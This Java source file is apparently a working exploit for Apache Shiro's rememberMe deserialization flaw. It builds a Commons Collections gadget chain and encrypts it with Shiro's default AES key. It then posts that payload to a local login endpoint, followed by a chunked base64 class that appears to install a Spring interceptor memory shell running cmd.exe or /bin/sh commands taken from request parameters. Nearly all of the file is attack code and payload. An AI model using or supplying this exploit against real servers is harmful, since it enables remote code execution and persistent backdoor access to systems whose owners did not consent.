import cn.hutool.http.HttpRequest;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * hashMap.readObject()
 * hashMap.hash()
 * TiedMapEntry.hashCode()
 * TiedMapEntry.getValue()
 * LazyMap.get()
 * InstantiateTransformer.transform()
 * TrAXFilter.TrAXFilter()
 * TransformerImpl.newTransformer()
 * TransformerImpl.getTransletInstance()
 * TransformerImpl.defineTransletClasses()
 * TransletClassLoader.defineClass()
 * (AbstractTranslet) evilclass.newInstance()
 * */

public class CommonsCollectionsShiro2 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(MemThread.class.getName()).toBytecode()
        });
        setFieldValue(templates, "_name", "EvilTemplatesImpl");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer faketransformer = new InvokerTransformer("getClass", null, null);
        Transformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, faketransformer);
//        Map outerMap = DefaultedMap.decorate(innerMap, transformer);

        TiedMapEntry tiedmapentry = new TiedMapEntry(outerMap, TrAXFilter.class);
        Map expMap = new HashMap();
        expMap.put(tiedmapentry, "valuevalue");

        // 清除键值
        outerMap.clear();
        // 通过反射覆盖原本的factory，防止序列化时在本地触发恶意方法
        setFieldValue(outerMap, "factory", transformer);

        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key);
//        System.out.println(ciphertext.toString());
        String rem = ciphertext.toString();

        // 测试
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        ois.readObject();
//        ois.close();

        String url="http://127.0.0.1:8079/doLogin";
        HttpRequest httpRequest = HttpRequest.post(url)
                .header("ri", "r1cky")
                .cookie("rememberMe="+rem)
                .form("username", "1")
                .form("password", "1");
        httpRequest.execute();

        String mem_code = "yv66vgAAADQA2woAMAByCgBzAHQIAHULAHYAdwcAeAcAeQsABQB6BwB7CAA9CgB8AH0KAH4AfwoAfgCABwCBBwCCCABJCgAOAIMKAA0AhAcAhQgAhgsAhwCICwCJAIoIAIsIAIwKAI0AjgoAHQCPCACQCgAdAJEHAJIHAJMIAJQIAJUKABwAlggAlwgAmAcAmQoAHACaCgCbAJwKACMAnQgAngoAIwCfCgAjAKAKACMAoQoAIwCiCgCjAKQKAKMApQoAowCiCwCJAKYHAKcHAKgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBAAFyAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmc7AQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQATYWRhcHRlZEludGVyY2VwdG9ycwEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEAA21lbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHRoaXMBABFMTWVtSW50ZXJjZXB0b3JzOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAClMamF2YS91dGlsL0FycmF5TGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEADVN0YWNrTWFwVGFibGUHAIIHAIUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAANhYWEBABJMamF2YS9sYW5nL1N0cmluZzsBABBNZXRob2RQYXJhbWV0ZXJzAQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAR2YXI4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIHAJMHAKkHAJIHAJkHAKoHAKsHAKwBAApFeGNlcHRpb25zAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcArQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUTWVtSW50ZXJjZXB0b3JzLmphdmEMADIAMwcArgwArwCwAQA5b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5EaXNwYXRjaGVyU2VydmxldC5DT05URVhUBwCxDACyALMBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMALQAtQEAPm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nBwC2DAC3ALgHALkMALoAuwwAvAC9AQATamF2YS91dGlsL0FycmF5TGlzdAEAD01lbUludGVyY2VwdG9ycwwAMgBIDAC+AL8BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQABeAcAqgwAwADBBwCrDADCAMMBAAABAAdvcy5uYW1lBwDEDADFAMEMAMYAxwEAA3dpbgwAyADJAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAMgDKAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAMsAzAcAzQwAzgDPDAAyANABAAJcQQwA0QDSDADTANQMANUAxwwA1gAzBwCpDADXAEgMANgAMwwA2QDaAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQATamF2YS9pby9QcmludFdyaXRlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEGphdmEvbGFuZy9PYmplY3QBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhAA4AMAABADEAAAAFAAEAMgAzAAEANAAAAQIAAwAGAAAATiq3AAG4AAISAwO5AAQDAMAABUwrEga5AAcCAMAABk0SCBIJtgAKTi0EtgALLSy2AAzAAA06BLsADlkSD7cAEDoFGQQZBbYAEVenAARMsQABAAQASQBMABIABAA1AAAALgALAAAAFAAEABYAEwAYAB8AGgAnABsALAAdADYAHgBBAB8ASQAiAEwAIQBNACMANgAAAD4ABgATADYANwA4AAEAHwAqADkAOgACACcAIgA7ADwAAwA2ABMAPQA+AAQAQQAIAD8AQAAFAAAATgBBAEIAAABDAAAADAABADYAEwA9AEQABABFAAAAEAAC/wBMAAEHAEYAAQcARwAAAgAyAEgAAgA0AAAAOQABAAIAAAAFKrcAAbEAAAACADUAAAAGAAEAAAAlADYAAAAWAAIAAAAFAEEAQgAAAAAABQBJAEoAAQBLAAAABQEASQAAAAEATABNAAMANAAAAeMABgAJAAAAwCsSE7kAFAIAOgQsuQAVAQA6BRkExgCUEhY6BhIXuAAYtgAZEhq2ABuZACK7ABxZBr0AHVkDEh5TWQQSH1NZBRkEU7cAIDoHpwAfuwAcWQa9AB1ZAxIhU1kEEiJTWQUZBFO3ACA6B7sAI1kZB7YAJLYAJbcAJhIntgAoOggZCLYAKZkACxkItgAqpwAFGQY6BhkItgArGQUZBrYALBkFtgAtGQW2AC4ErCwRAZS5AC8CAASsOgQsEQGUuQAvAgAErAACAAAApwCzABIAqACyALMAEgADADUAAABOABMAAAApAAoAKgASACsAFwAsABsALgArAC8ASgAxAGYANAB8ADUAkAA2AJUANwCcADgAoQA5AKYAOgCoADwAsQA9ALMAPwC1AEAAvgBBADYAAABwAAsARwADAE4ATwAHABsAjQBQAEoABgBmAEIATgBPAAcAfAAsAFEAUgAIAAoAqQBTAEoABAASAKEAVABVAAUAtQALAFYAVwAEAAAAwABBAEIAAAAAAMAAWABZAAEAAADAAFoAWwACAAAAwABcAEAAAwBFAAAANwAG/gBKBwBdBwBeBwBd/AAbBwBf/AAlBwBgQQcAXfgAGf8ACgAEBwBGBwBhBwBiBwBjAAEHAEcAZAAAAAQAAQASAEsAAAANAwBYAAAAWgAAAFwAAAABAGUAZgADADQAAAA/AAAAAwAAAAGxAAAAAgA1AAAABgABAAAARgA2AAAAIAADAAAAAQBBAEIAAAAAAAEAZwBoAAEAAAABAGkAagACAGQAAAAEAAEAawBLAAAACQIAZwAAAGkAAAABAGUAbAADADQAAABJAAAABAAAAAGxAAAAAgA1AAAABgABAAAASQA2AAAAKgAEAAAAAQBBAEIAAAAAAAEAZwBoAAEAAAABAG0AbgACAAAAAQBcAG8AAwBkAAAABAABAGsASwAAAA0DAGcAAABtAAAAXAAAAAEAcAAAAAIAcQ==";
        int len = 50;
        String[] mp = new String[len];
        for(int i = 0; i < len; i++){
            if(1 == len-i){
                mp[i] = mem_code.substring((mem_code.length() / len) * i);
            } else {
                mp[i] = mem_code.substring((mem_code.length() / len) * i, (mem_code.length() / len) * (i + 1));
            }
            httpRequest = HttpRequest.post(url)
                    .header("ri", mp[i])
                    .cookie("rememberMe="+rem)
                    .form("username", "1")
                    .form("password", "1");
            String res = httpRequest.execute().body();
            System.out.println("Result "+i+": "+res+"\n");
//            System.out.println(mp[i]+"\n");
        }

//        HttpRequest httpRequest1 = HttpRequest.post(url)
//                .cookie("rememberMe="+rem)
//                .form("username", "1")
//                .form("password", "1");
//        String res = httpRequest1.execute().body();
//        System.out.println(res);


//        String url="http://127.0.0.1:8079/doLogin";
//        HttpRequest httpRequest = HttpRequest.post(url)
//                .header("ra", mp[0])
//                .header("rb", mp[1])
//                .header("rc", mp[2])
//                .header("rd", mp[3])
//                .header("re", mp[4])
//                .header("rf", mp[5])
//                .header("rg", mp[6])
//                .header("rh", mp[7])
//                .header("ri", mp[8])
//                .header("rj", mp[9])
//                .header("rk", mp[10])
//                .cookie("rememberMe="+rem)
//                .form("username", "1")
//                .form("password", "1");
//        String res = httpRequest.execute().body();
//        System.out.println(res);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}